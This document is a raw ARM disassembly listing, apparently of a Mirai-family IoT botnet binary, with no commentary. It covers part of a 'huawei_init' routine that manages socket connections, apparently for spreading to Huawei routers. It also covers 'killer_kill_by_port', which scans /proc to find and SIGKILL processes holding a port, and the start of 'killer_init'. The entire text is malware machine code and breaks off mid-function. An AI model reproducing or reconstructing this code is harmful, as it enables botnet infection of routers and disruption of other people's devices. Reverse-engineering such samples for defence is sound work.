    ff38:	e2811004 	add	r1, r1, #4
    ff3c:	e2822004 	add	r2, r2, #4
    ff40:	e1a03004 	mov	r3, r4
    ff44:	e2800001 	add	r0, r0, #1
    ff48:	e58dc000 	str	ip, [sp]
    ff4c:	e58d4718 	str	r4, [sp, #1816]	; 0x718
    ff50:	eb0018d1 	bl	1629c <__libc_select>
    ff54:	e1a00004 	mov	r0, r4
    ff58:	eb001923 	bl	163ec <__GI_time>
    ff5c:	e59fe288 	ldr	lr, [pc, #648]	; 101ec <huawei_init+0xacc>
    ff60:	e58d4724 	str	r4, [sp, #1828]	; 0x724
    ff64:	e58e0000 	str	r0, [lr]
    ff68:	ea00000b 	b	ff9c <huawei_init+0x87c>
    ff6c:	e28dee72 	add	lr, sp, #1824	; 0x720
    ff70:	e28ee008 	add	lr, lr, #8
    ff74:	e081200e 	add	r2, r1, lr
    ff78:	e51230a4 	ldr	r3, [r2, #-164]	; 0xffffff5c
    ff7c:	e1a03453 	asr	r3, r3, r4
    ff80:	e3130001 	tst	r3, #1
    ff84:	1a000043 	bne	10098 <huawei_init+0x978>
    ff88:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
    ff8c:	e2834001 	add	r4, r3, #1
    ff90:	e354007f 	cmp	r4, #127	; 0x7f
    ff94:	e58d4724 	str	r4, [sp, #1828]	; 0x724
    ff98:	cafffe66 	bgt	f938 <huawei_init+0x218>
    ff9c:	e1a03284 	lsl	r3, r4, #5
    ffa0:	e0433184 	sub	r3, r3, r4, lsl #3
    ffa4:	e1a02183 	lsl	r2, r3, #3
    ffa8:	e59f1240 	ldr	r1, [pc, #576]	; 101f0 <huawei_init+0xad0>
    ffac:	e0632002 	rsb	r2, r3, r2
    ffb0:	e5917000 	ldr	r7, [r1]
    ffb4:	e0822004 	add	r2, r2, r4
    ffb8:	e1a05282 	lsl	r5, r2, #5
    ffbc:	e7950007 	ldr	r0, [r5, r7]
    ffc0:	e3700001 	cmn	r0, #1
    ffc4:	e0856007 	add	r6, r5, r7
    ffc8:	0affffee 	beq	ff88 <huawei_init+0x868>
    ffcc:	e1a022a0 	lsr	r2, r0, #5
    ffd0:	e28d3e72 	add	r3, sp, #1824	; 0x720
    ffd4:	e2833008 	add	r3, r3, #8
    ffd8:	e1a01102 	lsl	r1, r2, #2
    ffdc:	e0812003 	add	r2, r1, r3
    ffe0:	e5123124 	ldr	r3, [r2, #-292]	; 0xfffffedc
    ffe4:	e200401f 	and	r4, r0, #31
    ffe8:	e1a03453 	asr	r3, r3, r4
    ffec:	e3130001 	tst	r3, #1
    fff0:	0affffdd 	beq	ff6c <huawei_init+0x84c>
    fff4:	e3a08004 	mov	r8, #4
    fff8:	e28dce71 	add	ip, sp, #1808	; 0x710
    fffc:	e28d3e72 	add	r3, sp, #1824	; 0x720
   10000:	e28cc00c 	add	ip, ip, #12
   10004:	e3a04000 	mov	r4, #0
   10008:	e3a01001 	mov	r1, #1
   1000c:	e1a02008 	mov	r2, r8
   10010:	e58d4720 	str	r4, [sp, #1824]	; 0x720
   10014:	e58d871c 	str	r8, [sp, #1820]	; 0x71c
   10018:	e58dc000 	str	ip, [sp]
   1001c:	eb001b15 	bl	16c78 <getsockopt>
   10020:	e59d3720 	ldr	r3, [sp, #1824]	; 0x720
   10024:	e1900003 	orrs	r0, r0, r3
   10028:	1a000067 	bne	101cc <huawei_init+0xaac>
   1002c:	e5963008 	ldr	r3, [r6, #8]
   10030:	e3530003 	cmp	r3, #3
   10034:	0a000050 	beq	1017c <huawei_init+0xa5c>
   10038:	e3530004 	cmp	r3, #4
   1003c:	0a000062 	beq	101cc <huawei_init+0xaac>
   10040:	e7953007 	ldr	r3, [r5, r7]
   10044:	e1a022a3 	lsr	r2, r3, #5
   10048:	e203401f 	and	r4, r3, #31
   1004c:	e1a01102 	lsl	r1, r2, #2
   10050:	e3a03003 	mov	r3, #3
   10054:	e5863008 	str	r3, [r6, #8]
   10058:	eaffffc3 	b	ff6c <huawei_init+0x84c>
   1005c:	03a03068 	moveq	r3, #104	; 0x68
   10060:	058a3000 	streq	r3, [sl]
   10064:	0a000004 	beq	1007c <huawei_init+0x95c>
   10068:	e3700001 	cmn	r0, #1
   1006c:	1a000023 	bne	10100 <huawei_init+0x9e0>
   10070:	e59a3000 	ldr	r3, [sl]
   10074:	e353000b 	cmp	r3, #11
   10078:	0affffc2 	beq	ff88 <huawei_init+0x868>
   1007c:	e5963008 	ldr	r3, [r6, #8]
   10080:	e3530003 	cmp	r3, #3
   10084:	1a000032 	bne	10154 <huawei_init+0xa34>
   10088:	e5960000 	ldr	r0, [r6]
   1008c:	eb00276b 	bl	19e40 <__GI___libc_close>
   10090:	e1a00006 	mov	r0, r6
   10094:	ebfffd6c 	bl	f64c <huawei_setup_connection>
   10098:	e5963008 	ldr	r3, [r6, #8]
   1009c:	e3530000 	cmp	r3, #0
   100a0:	0affffb8 	beq	ff88 <huawei_init+0x868>
   100a4:	e5963014 	ldr	r3, [r6, #20]
   100a8:	e3530c01 	cmp	r3, #256	; 0x100
   100ac:	12865018 	addne	r5, r6, #24
   100b0:	0a00001e 	beq	10130 <huawei_init+0xa10>
   100b4:	e3a07000 	mov	r7, #0
   100b8:	e58a7000 	str	r7, [sl]
   100bc:	e5962014 	ldr	r2, [r6, #20]
   100c0:	e0854002 	add	r4, r5, r2
   100c4:	e5960000 	ldr	r0, [r6]
   100c8:	e2622c01 	rsb	r2, r2, #256	; 0x100
   100cc:	e1a01004 	mov	r1, r4
   100d0:	e3a03901 	mov	r3, #16384	; 0x4000
   100d4:	eb001b1a 	bl	16d44 <__libc_recv>
   100d8:	e3500000 	cmp	r0, #0
   100dc:	daffffde 	ble	1005c <huawei_init+0x93c>
   100e0:	e1a02007 	mov	r2, r7
   100e4:	e7d23004 	ldrb	r3, [r2, r4]
   100e8:	e3530000 	cmp	r3, #0
   100ec:	02833041 	addeq	r3, r3, #65	; 0x41
   100f0:	07c23004 	strbeq	r3, [r2, r4]
   100f4:	e2822001 	add	r2, r2, #1
   100f8:	e1520000 	cmp	r2, r0
   100fc:	1afffff8 	bne	100e4 <huawei_init+0x9c4>
   10100:	e59f10e4 	ldr	r1, [pc, #228]	; 101ec <huawei_init+0xacc>
   10104:	e5963014 	ldr	r3, [r6, #20]
   10108:	e5912000 	ldr	r2, [r1]
   1010c:	e0833000 	add	r3, r3, r0
   10110:	e5863014 	str	r3, [r6, #20]
   10114:	e5862004 	str	r2, [r6, #4]
   10118:	e1a00005 	mov	r0, r5
   1011c:	eb001281 	bl	14b28 <util_strlen>
   10120:	e3a03000 	mov	r3, #0
   10124:	e0860000 	add	r0, r6, r0
   10128:	e5c03018 	strb	r3, [r0, #24]
   1012c:	eaffffd9 	b	10098 <huawei_init+0x978>
   10130:	e2865018 	add	r5, r6, #24
   10134:	e1a00005 	mov	r0, r5
   10138:	e2861058 	add	r1, r6, #88	; 0x58
   1013c:	e3a020c0 	mov	r2, #192	; 0xc0
   10140:	eb0019de 	bl	168c0 <__GI_memmove>
   10144:	e5963014 	ldr	r3, [r6, #20]
   10148:	e2433040 	sub	r3, r3, #64	; 0x40
   1014c:	e5863014 	str	r3, [r6, #20]
   10150:	eaffffd7 	b	100b4 <huawei_init+0x994>
   10154:	e5960000 	ldr	r0, [r6]
   10158:	eb002738 	bl	19e40 <__GI___libc_close>
   1015c:	e3a03000 	mov	r3, #0
   10160:	e3e02000 	mvn	r2, #0
   10164:	e5863008 	str	r3, [r6, #8]
   10168:	e5862000 	str	r2, [r6]
   1016c:	e1a00005 	mov	r0, r5
   10170:	e3a01c01 	mov	r1, #256	; 0x100
   10174:	eb001290 	bl	14bbc <util_zero>
   10178:	eaffff82 	b	ff88 <huawei_init+0x868>
   1017c:	e2864f47 	add	r4, r6, #284	; 0x11c
   10180:	e59f1078 	ldr	r1, [pc, #120]	; 10200 <huawei_init+0xae0>
   10184:	e1a00004 	mov	r0, r4
   10188:	eb001270 	bl	14b50 <util_strcpy>
   1018c:	e1a00004 	mov	r0, r4
   10190:	e7955007 	ldr	r5, [r5, r7]
   10194:	eb001263 	bl	14b28 <util_strlen>
   10198:	e3a03901 	mov	r3, #16384	; 0x4000
   1019c:	e1a02000 	mov	r2, r0
   101a0:	e1a01004 	mov	r1, r4
   101a4:	e1a00005 	mov	r0, r5
   101a8:	eb001b46 	bl	16ec8 <__libc_send>
   101ac:	e1a00004 	mov	r0, r4
   101b0:	e3a01c0a 	mov	r1, #2560	; 0xa00
   101b4:	eb001280 	bl	14bbc <util_zero>
   101b8:	e2860018 	add	r0, r6, #24
   101bc:	e3a01c01 	mov	r1, #256	; 0x100
   101c0:	eb00127d 	bl	14bbc <util_zero>
   101c4:	e5868008 	str	r8, [r6, #8]
   101c8:	eaffff6e 	b	ff88 <huawei_init+0x868>
   101cc:	e7950007 	ldr	r0, [r5, r7]
   101d0:	eb00271a 	bl	19e40 <__GI___libc_close>
   101d4:	e3e03000 	mvn	r3, #0
   101d8:	e7853007 	str	r3, [r5, r7]
   101dc:	e5864008 	str	r4, [r6, #8]
   101e0:	eaffff68 	b	ff88 <huawei_init+0x868>
   101e4:	00028cc4 	.word	0x00028cc4
   101e8:	0002b8ac 	.word	0x0002b8ac
   101ec:	00028cf4 	.word	0x00028cf4
   101f0:	0002b8b0 	.word	0x0002b8b0
   101f4:	00028cc8 	.word	0x00028cc8
   101f8:	00028ccc 	.word	0x00028ccc
   101fc:	55555556 	.word	0x55555556
   10200:	0001f3b8 	.word	0x0001f3b8

00010204 <killer_kill>:
   10204:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   10208:	e59f3018 	ldr	r3, [pc, #24]	; 10228 <killer_kill+0x24>
   1020c:	e24dd004 	sub	sp, sp, #4
   10210:	e5930000 	ldr	r0, [r3]
   10214:	e3a01009 	mov	r1, #9
   10218:	eb0017df 	bl	1619c <__GI_kill>
   1021c:	e28dd004 	add	sp, sp, #4
   10220:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   10224:	e12fff1e 	bx	lr
   10228:	0002b8b8 	.word	0x0002b8b8

0001022c <killer_kill_by_port>:
   1022c:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   10230:	e24ddc22 	sub	sp, sp, #8704	; 0x2200
   10234:	e24dd02c 	sub	sp, sp, #44	; 0x2c
   10238:	e28d6a02 	add	r6, sp, #8192	; 0x2000
   1023c:	e2866008 	add	r6, r6, #8
   10240:	e28d3a02 	add	r3, sp, #8192	; 0x2000
   10244:	e3a05000 	mov	r5, #0
   10248:	e2466001 	sub	r6, r6, #1
   1024c:	e3a02c02 	mov	r2, #512	; 0x200
   10250:	e28db028 	add	fp, sp, #40	; 0x28
   10254:	e28daa01 	add	sl, sp, #4096	; 0x1000
   10258:	e5835218 	str	r5, [r3, #536]	; 0x218
   1025c:	e583521c 	str	r5, [r3, #540]	; 0x21c
   10260:	e5835220 	str	r5, [r3, #544]	; 0x220
   10264:	e5835224 	str	r5, [r3, #548]	; 0x224
   10268:	e1a04000 	mov	r4, r0
   1026c:	e2822001 	add	r2, r2, #1
   10270:	e1a01005 	mov	r1, r5
   10274:	e24bb021 	sub	fp, fp, #33	; 0x21
   10278:	e1a00006 	mov	r0, r6
   1027c:	e28aa028 	add	sl, sl, #40	; 0x28
   10280:	eb001992 	bl	168d0 <__GI_memset>
   10284:	e24aa021 	sub	sl, sl, #33	; 0x21
   10288:	e1a01005 	mov	r1, r5
   1028c:	e3a02a01 	mov	r2, #4096	; 0x1000
   10290:	e1a0000b 	mov	r0, fp
   10294:	eb00198d 	bl	168d0 <__GI_memset>
   10298:	e28d9c22 	add	r9, sp, #8704	; 0x2200
   1029c:	e1a01005 	mov	r1, r5
   102a0:	e3a02a01 	mov	r2, #4096	; 0x1000
   102a4:	e1a0000a 	mov	r0, sl
   102a8:	eb001988 	bl	168d0 <__GI_memset>
   102ac:	e2899008 	add	r9, r9, #8
   102b0:	e1a00424 	lsr	r0, r4, #8
   102b4:	e20440ff 	and	r4, r4, #255	; 0xff
   102b8:	e3a01010 	mov	r1, #16
   102bc:	e1a02009 	mov	r2, r9
   102c0:	e1800404 	orr	r0, r0, r4, lsl #8
   102c4:	eb001353 	bl	15018 <util_itoa>
   102c8:	e1a00009 	mov	r0, r9
   102cc:	eb001215 	bl	14b28 <util_strlen>
   102d0:	e3500002 	cmp	r0, #2
   102d4:	0a00012e 	beq	10794 <killer_kill_by_port+0x568>
   102d8:	e3a00005 	mov	r0, #5
   102dc:	eb000c8f 	bl	13520 <table_unlock_val>
   102e0:	e3a00006 	mov	r0, #6
   102e4:	eb000c8d 	bl	13520 <table_unlock_val>
   102e8:	e3a00007 	mov	r0, #7
   102ec:	eb000c8b 	bl	13520 <table_unlock_val>
   102f0:	e3a00008 	mov	r0, #8
   102f4:	eb000c89 	bl	13520 <table_unlock_val>
   102f8:	e1a01005 	mov	r1, r5
   102fc:	e3a00008 	mov	r0, #8
   10300:	eb000c55 	bl	1345c <table_retrieve_val>
   10304:	e1a01005 	mov	r1, r5
   10308:	eb0026f0 	bl	19ed0 <__GI___libc_open>
   1030c:	e3700001 	cmn	r0, #1
   10310:	e1a08000 	mov	r8, r0
   10314:	01a04005 	moveq	r4, r5
   10318:	0a000104 	beq	10730 <killer_kill_by_port+0x504>
   1031c:	e1a00006 	mov	r0, r6
   10320:	e3a01c02 	mov	r1, #512	; 0x200
   10324:	e1a02008 	mov	r2, r8
   10328:	eb001296 	bl	14d88 <util_fdgets>
   1032c:	e3500000 	cmp	r0, #0
   10330:	0a00005f 	beq	104b4 <killer_kill_by_port+0x288>
   10334:	e28d0a02 	add	r0, sp, #8192	; 0x2000
   10338:	e5d03007 	ldrb	r3, [r0, #7]
   1033c:	e3530000 	cmp	r3, #0
   10340:	1353003a 	cmpne	r3, #58	; 0x3a
   10344:	03a02000 	moveq	r2, #0
   10348:	13a02001 	movne	r2, #1
   1034c:	01a01002 	moveq	r1, r2
   10350:	0a000005 	beq	1036c <killer_kill_by_port+0x140>
   10354:	e3a01000 	mov	r1, #0
   10358:	e2811001 	add	r1, r1, #1
   1035c:	e7d13006 	ldrb	r3, [r1, r6]
   10360:	e3530000 	cmp	r3, #0
   10364:	1353003a 	cmpne	r3, #58	; 0x3a
   10368:	1afffffa 	bne	10358 <killer_kill_by_port+0x12c>
   1036c:	e3530000 	cmp	r3, #0
   10370:	0affffe9 	beq	1031c <killer_kill_by_port+0xf0>
   10374:	e28d3c22 	add	r3, sp, #8704	; 0x2200
   10378:	e2810002 	add	r0, r1, #2
   1037c:	e2833028 	add	r3, r3, #40	; 0x28
   10380:	e0832000 	add	r2, r3, r0
   10384:	e5523221 	ldrb	r3, [r2, #-545]	; 0xfffffddf
   10388:	e3530000 	cmp	r3, #0
   1038c:	13530020 	cmpne	r3, #32
   10390:	01a05000 	moveq	r5, r0
   10394:	0a000007 	beq	103b8 <killer_kill_by_port+0x18c>
   10398:	e0862001 	add	r2, r6, r1
   1039c:	e1a05000 	mov	r5, r0
   103a0:	e5d23003 	ldrb	r3, [r2, #3]
   103a4:	e3530000 	cmp	r3, #0
   103a8:	13530020 	cmpne	r3, #32
   103ac:	e2855001 	add	r5, r5, #1
   103b0:	e2822001 	add	r2, r2, #1
   103b4:	1afffff9 	bne	103a0 <killer_kill_by_port+0x174>
   103b8:	e0864000 	add	r4, r6, r0
   103bc:	e28d0c22 	add	r0, sp, #8704	; 0x2200
   103c0:	e2800028 	add	r0, r0, #40	; 0x28
   103c4:	e0803005 	add	r3, r0, r5
   103c8:	e3a07000 	mov	r7, #0
   103cc:	e5437221 	strb	r7, [r3, #-545]	; 0xfffffddf
   103d0:	e1a00004 	mov	r0, r4
   103d4:	eb0011d3 	bl	14b28 <util_strlen>
   103d8:	e1a02009 	mov	r2, r9
   103dc:	e1a01000 	mov	r1, r0
   103e0:	e1a00004 	mov	r0, r4
   103e4:	eb0012a2 	bl	14e74 <util_stristr>
   103e8:	e3700001 	cmn	r0, #1
   103ec:	11a01007 	movne	r1, r7
   103f0:	10862005 	addne	r2, r6, r5
   103f4:	1285c001 	addne	ip, r5, #1
   103f8:	11a00001 	movne	r0, r1
   103fc:	11a0e001 	movne	lr, r1
   10400:	0affffc5 	beq	1031c <killer_kill_by_port+0xf0>
   10404:	e5d23002 	ldrb	r3, [r2, #2]
   10408:	e3530000 	cmp	r3, #0
   1040c:	e28cc001 	add	ip, ip, #1
   10410:	0a000009 	beq	1043c <killer_kill_by_port+0x210>
   10414:	e3530009 	cmp	r3, #9
   10418:	13530020 	cmpne	r3, #32
   1041c:	03a01001 	moveq	r1, #1
   10420:	0a000002 	beq	10430 <killer_kill_by_port+0x204>
   10424:	e3510001 	cmp	r1, #1
   10428:	0a0000c5 	beq	10744 <killer_kill_by_port+0x518>
   1042c:	e3a01000 	mov	r1, #0
   10430:	e3500006 	cmp	r0, #6
   10434:	e2822001 	add	r2, r2, #1
   10438:	dafffff1 	ble	10404 <killer_kill_by_port+0x1d8>
   1043c:	e35e0000 	cmp	lr, #0
   10440:	e1a0000c 	mov	r0, ip
   10444:	0affffb4 	beq	1031c <killer_kill_by_port+0xf0>
   10448:	e28d1c22 	add	r1, sp, #8704	; 0x2200
   1044c:	e2811028 	add	r1, r1, #40	; 0x28
   10450:	e081200c 	add	r2, r1, ip
   10454:	e5523221 	ldrb	r3, [r2, #-545]	; 0xfffffddf
   10458:	e3530000 	cmp	r3, #0
   1045c:	13530020 	cmpne	r3, #32
   10460:	0a000008 	beq	10488 <killer_kill_by_port+0x25c>
   10464:	e086200c 	add	r2, r6, ip
   10468:	e5f23001 	ldrb	r3, [r2, #1]!
   1046c:	e3530000 	cmp	r3, #0
   10470:	13530020 	cmpne	r3, #32
   10474:	e28cc001 	add	ip, ip, #1
   10478:	1afffffa 	bne	10468 <killer_kill_by_port+0x23c>
   1047c:	e28d3c22 	add	r3, sp, #8704	; 0x2200
   10480:	e2833028 	add	r3, r3, #40	; 0x28
   10484:	e083200c 	add	r2, r3, ip
   10488:	e3a03000 	mov	r3, #0
   1048c:	e0864000 	add	r4, r6, r0
   10490:	e1a00004 	mov	r0, r4
   10494:	e5423221 	strb	r3, [r2, #-545]	; 0xfffffddf
   10498:	eb0011a2 	bl	14b28 <util_strlen>
   1049c:	e350000f 	cmp	r0, #15
   104a0:	caffff9d 	bgt	1031c <killer_kill_by_port+0xf0>
   104a4:	e28d0c22 	add	r0, sp, #8704	; 0x2200
   104a8:	e1a01004 	mov	r1, r4
   104ac:	e2800018 	add	r0, r0, #24
   104b0:	eb0011a6 	bl	14b50 <util_strcpy>
   104b4:	e1a00008 	mov	r0, r8
   104b8:	eb002660 	bl	19e40 <__GI___libc_close>
   104bc:	e28d0c22 	add	r0, sp, #8704	; 0x2200
   104c0:	e2800018 	add	r0, r0, #24
   104c4:	eb001197 	bl	14b28 <util_strlen>
   104c8:	e2504000 	subs	r4, r0, #0
   104cc:	0a0000a7 	beq	10770 <killer_kill_by_port+0x544>
   104d0:	e3a01000 	mov	r1, #0
   104d4:	e3a00005 	mov	r0, #5
   104d8:	eb000bdf 	bl	1345c <table_retrieve_val>
   104dc:	eb001846 	bl	165fc <__GI_opendir>
   104e0:	e2509000 	subs	r9, r0, #0
   104e4:	01a04009 	moveq	r4, r9
   104e8:	13a05000 	movne	r5, #0
   104ec:	0a000087 	beq	10710 <killer_kill_by_port+0x4e4>
   104f0:	e1a00009 	mov	r0, r9
   104f4:	eb00189d 	bl	16770 <__GI_readdir>
   104f8:	e2502000 	subs	r2, r0, #0
   104fc:	0a000080 	beq	10704 <killer_kill_by_port+0x4d8>
   10500:	e3550000 	cmp	r5, #0
   10504:	1a00007e 	bne	10704 <killer_kill_by_port+0x4d8>
   10508:	e5d2300b 	ldrb	r3, [r2, #11]
   1050c:	e2433030 	sub	r3, r3, #48	; 0x30
   10510:	e3530009 	cmp	r3, #9
   10514:	8afffff5 	bhi	104f0 <killer_kill_by_port+0x2c4>
   10518:	e1a01005 	mov	r1, r5
   1051c:	e3a00005 	mov	r0, #5
   10520:	e282700b 	add	r7, r2, #11
   10524:	eb000bcc 	bl	1345c <table_retrieve_val>
   10528:	e1a01000 	mov	r1, r0
   1052c:	e1a0000a 	mov	r0, sl
   10530:	eb001186 	bl	14b50 <util_strcpy>
   10534:	e1a0000a 	mov	r0, sl
   10538:	eb00117a 	bl	14b28 <util_strlen>
   1053c:	e1a01007 	mov	r1, r7
   10540:	e080000a 	add	r0, r0, sl
   10544:	eb001181 	bl	14b50 <util_strcpy>
   10548:	e1a0000a 	mov	r0, sl
   1054c:	eb001175 	bl	14b28 <util_strlen>
   10550:	e1a01005 	mov	r1, r5
   10554:	e1a04000 	mov	r4, r0
   10558:	e3a00006 	mov	r0, #6
   1055c:	eb000bbe 	bl	1345c <table_retrieve_val>
   10560:	e1a01000 	mov	r1, r0
   10564:	e084000a 	add	r0, r4, sl
   10568:	eb001178 	bl	14b50 <util_strcpy>
   1056c:	e1a0000a 	mov	r0, sl
   10570:	e1a0100b 	mov	r1, fp
   10574:	e3a02a01 	mov	r2, #4096	; 0x1000
   10578:	eb001726 	bl	16218 <__GI_readlink>
   1057c:	e3700001 	cmn	r0, #1
   10580:	0affffda 	beq	104f0 <killer_kill_by_port+0x2c4>
   10584:	e1a01005 	mov	r1, r5
   10588:	e3a00005 	mov	r0, #5
   1058c:	eb000bb2 	bl	1345c <table_retrieve_val>
   10590:	e1a01000 	mov	r1, r0
   10594:	e1a0000a 	mov	r0, sl
   10598:	eb00116c 	bl	14b50 <util_strcpy>
   1059c:	e1a0000a 	mov	r0, sl
   105a0:	eb001160 	bl	14b28 <util_strlen>
   105a4:	e1a01007 	mov	r1, r7
   105a8:	e080000a 	add	r0, r0, sl
   105ac:	eb001167 	bl	14b50 <util_strcpy>
   105b0:	e1a0000a 	mov	r0, sl
   105b4:	eb00115b 	bl	14b28 <util_strlen>
   105b8:	e1a01005 	mov	r1, r5
   105bc:	e1a04000 	mov	r4, r0
   105c0:	e3a00007 	mov	r0, #7
   105c4:	eb000ba4 	bl	1345c <table_retrieve_val>
   105c8:	e1a01000 	mov	r1, r0
   105cc:	e084000a 	add	r0, r4, sl
   105d0:	eb00115e 	bl	14b50 <util_strcpy>
   105d4:	e1a0000a 	mov	r0, sl
   105d8:	eb001807 	bl	165fc <__GI_opendir>
   105dc:	e2508000 	subs	r8, r0, #0
   105e0:	0affffc2 	beq	104f0 <killer_kill_by_port+0x2c4>
   105e4:	e1a00008 	mov	r0, r8
   105e8:	eb001860 	bl	16770 <__GI_readdir>
   105ec:	e2506000 	subs	r6, r0, #0
   105f0:	e3a01a01 	mov	r1, #4096	; 0x1000
   105f4:	e1a0000b 	mov	r0, fp
   105f8:	0a00003b 	beq	106ec <killer_kill_by_port+0x4c0>
   105fc:	e3550000 	cmp	r5, #0
   10600:	1a000039 	bne	106ec <killer_kill_by_port+0x4c0>
   10604:	eb00116c 	bl	14bbc <util_zero>
   10608:	e1a01005 	mov	r1, r5
   1060c:	e3a00005 	mov	r0, #5
   10610:	eb000b91 	bl	1345c <table_retrieve_val>
   10614:	e1a01000 	mov	r1, r0
   10618:	e1a0000a 	mov	r0, sl
   1061c:	eb00114b 	bl	14b50 <util_strcpy>
   10620:	e1a0000a 	mov	r0, sl
   10624:	eb00113f 	bl	14b28 <util_strlen>
   10628:	e1a01007 	mov	r1, r7
   1062c:	e080000a 	add	r0, r0, sl
   10630:	eb001146 	bl	14b50 <util_strcpy>
   10634:	e1a0000a 	mov	r0, sl
   10638:	eb00113a 	bl	14b28 <util_strlen>
   1063c:	e1a01005 	mov	r1, r5
   10640:	e1a04000 	mov	r4, r0
   10644:	e3a00007 	mov	r0, #7
   10648:	eb000b83 	bl	1345c <table_retrieve_val>
   1064c:	e1a01000 	mov	r1, r0
   10650:	e084000a 	add	r0, r4, sl
   10654:	eb00113d 	bl	14b50 <util_strcpy>
   10658:	e1a0000a 	mov	r0, sl
   1065c:	eb001131 	bl	14b28 <util_strlen>
   10660:	e59f1154 	ldr	r1, [pc, #340]	; 107bc <killer_kill_by_port+0x590>
   10664:	e080000a 	add	r0, r0, sl
   10668:	eb001138 	bl	14b50 <util_strcpy>
   1066c:	e1a0000a 	mov	r0, sl
   10670:	eb00112c 	bl	14b28 <util_strlen>
   10674:	e286100b 	add	r1, r6, #11
   10678:	e080000a 	add	r0, r0, sl
   1067c:	eb001133 	bl	14b50 <util_strcpy>
   10680:	e1a0000a 	mov	r0, sl
   10684:	e1a0100b 	mov	r1, fp
   10688:	e3a02a01 	mov	r2, #4096	; 0x1000
   1068c:	eb0016e1 	bl	16218 <__GI_readlink>
   10690:	e3700001 	cmn	r0, #1
   10694:	e1a0000b 	mov	r0, fp
   10698:	0affffd1 	beq	105e4 <killer_kill_by_port+0x3b8>
   1069c:	eb001121 	bl	14b28 <util_strlen>
   106a0:	e28d2c22 	add	r2, sp, #8704	; 0x2200
   106a4:	e1a01000 	mov	r1, r0
   106a8:	e2822018 	add	r2, r2, #24
   106ac:	e1a0000b 	mov	r0, fp
   106b0:	eb0011ef 	bl	14e74 <util_stristr>
   106b4:	e3700001 	cmn	r0, #1
   106b8:	e3a0100a 	mov	r1, #10
   106bc:	e1a00007 	mov	r0, r7
   106c0:	0affffc7 	beq	105e4 <killer_kill_by_port+0x3b8>
   106c4:	eb001160 	bl	14c4c <util_atoi>
   106c8:	e3a01009 	mov	r1, #9
   106cc:	eb0016b2 	bl	1619c <__GI_kill>
   106d0:	e1a00008 	mov	r0, r8
   106d4:	eb001825 	bl	16770 <__GI_readdir>
   106d8:	e2506000 	subs	r6, r0, #0
   106dc:	e3a05001 	mov	r5, #1
   106e0:	e3a01a01 	mov	r1, #4096	; 0x1000
   106e4:	e1a0000b 	mov	r0, fp
   106e8:	1affffc3 	bne	105fc <killer_kill_by_port+0x3d0>
   106ec:	e1a00008 	mov	r0, r8
   106f0:	eb001749 	bl	1641c <__GI_closedir>
   106f4:	e1a00009 	mov	r0, r9
   106f8:	eb00181c 	bl	16770 <__GI_readdir>
   106fc:	e2502000 	subs	r2, r0, #0
   10700:	1affff7e 	bne	10500 <killer_kill_by_port+0x2d4>
   10704:	e1a00009 	mov	r0, r9
   10708:	eb001743 	bl	1641c <__GI_closedir>
   1070c:	e20540ff 	and	r4, r5, #255	; 0xff
   10710:	e3a00001 	mov	r0, #1
   10714:	eb002574 	bl	19cec <__GI_sleep>
   10718:	e3a00005 	mov	r0, #5
   1071c:	eb000b57 	bl	13480 <table_lock_val>
   10720:	e3a00006 	mov	r0, #6
   10724:	eb000b55 	bl	13480 <table_lock_val>
   10728:	e3a00007 	mov	r0, #7
   1072c:	eb000b53 	bl	13480 <table_lock_val>
   10730:	e1a00004 	mov	r0, r4
   10734:	e28ddf8b 	add	sp, sp, #556	; 0x22c
   10738:	e28dda02 	add	sp, sp, #8192	; 0x2000
   1073c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   10740:	e12fff1e 	bx	lr
   10744:	e2800001 	add	r0, r0, #1
   10748:	e3500001 	cmp	r0, #1
   1074c:	1affff36 	bne	1042c <killer_kill_by_port+0x200>
   10750:	e5d23003 	ldrb	r3, [r2, #3]
   10754:	e3530041 	cmp	r3, #65	; 0x41
   10758:	0a000002 	beq	10768 <killer_kill_by_port+0x53c>
   1075c:	e2822001 	add	r2, r2, #1
   10760:	e3a01000 	mov	r1, #0
   10764:	eaffff26 	b	10404 <killer_kill_by_port+0x1d8>
   10768:	e3a0e001 	mov	lr, #1
   1076c:	eafffffa 	b	1075c <killer_kill_by_port+0x530>
   10770:	e2800005 	add	r0, r0, #5
   10774:	eb000b41 	bl	13480 <table_lock_val>
   10778:	e3a00006 	mov	r0, #6
   1077c:	eb000b3f 	bl	13480 <table_lock_val>
   10780:	e3a00007 	mov	r0, #7
   10784:	eb000b3d 	bl	13480 <table_lock_val>
   10788:	e3a00008 	mov	r0, #8
   1078c:	eb000b3b 	bl	13480 <table_lock_val>
   10790:	eaffffe6 	b	10730 <killer_kill_by_port+0x504>
   10794:	e28d0c22 	add	r0, sp, #8704	; 0x2200
   10798:	e5d03008 	ldrb	r3, [r0, #8]
   1079c:	e5d02009 	ldrb	r2, [r0, #9]
   107a0:	e3a01030 	mov	r1, #48	; 0x30
   107a4:	e5c0300a 	strb	r3, [r0, #10]
   107a8:	e5c0200b 	strb	r2, [r0, #11]
   107ac:	e5c01009 	strb	r1, [r0, #9]
   107b0:	e5c0500c 	strb	r5, [r0, #12]
   107b4:	e5c01008 	strb	r1, [r0, #8]
   107b8:	eafffec6 	b	102d8 <killer_kill_by_port+0xac>
   107bc:	0001efa0 	.word	0x0001efa0

000107c0 <killer_init>:
   107c0:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   107c4:	e24ddd4a 	sub	sp, sp, #4736	; 0x1280
   107c8:	e24dd034 	sub	sp, sp, #52	; 0x34
   107cc:	e3a00000 	mov	r0, #0
   107d0:	eb001705 	bl	163ec <__GI_time>
   107d4:	e1a07000 	mov	r7, r0
   107d8:	eb0023dc 	bl	19750 <__libc_fork>
   107dc:	e3700001 	cmn	r0, #1
   107e0:	13a03000 	movne	r3, #0
   107e4:	03a03001 	moveq	r3, #1
   107e8:	e3500000 	cmp	r0, #0
   107ec:	d1a05003 	movle	r5, r3
   107f0:	c3835001 	orrgt	r5, r3, #1
   107f4:	e59f3720 	ldr	r3, [pc, #1824]	; 10f1c <killer_init+0x75c>
   107f8:	e3550000 	cmp	r5, #0
   107fc:	e5830000 	str	r0, [r3]
   10800:	0a000003 	beq	10814 <killer_init+0x54>
   10804:	e28ddfad 	add	sp, sp, #692	; 0x2b4
   10808:	e28dda01 	add	sp, sp, #4096	; 0x1000
